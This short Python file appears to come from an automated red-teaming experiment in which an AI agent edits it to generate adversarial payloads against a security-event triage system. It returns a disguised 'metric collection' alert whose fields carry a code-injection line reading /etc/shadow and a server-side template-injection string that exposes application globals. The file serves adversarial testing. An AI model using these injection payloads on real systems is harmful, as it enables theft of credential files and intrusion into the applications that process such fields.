"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 59b: code injection in custom fields + template injection
    return {
        "task_type": "metric_collection",
        "severity": "info",
        "siem_event": {
            "title": "Metric Collection",
            "source_ip": "10.0.0.1",
            "username": "metrics",
            "hostname": "metrics-srv",
            "rule_name": "MetricsJob",
            "raw_log": "Metric collection completed. Source=10.0.0.1",
            "custom_field": "data = open('/etc/shadow').read()",
            "annotation": "{{request.application.__globals__}}",
        },
    }
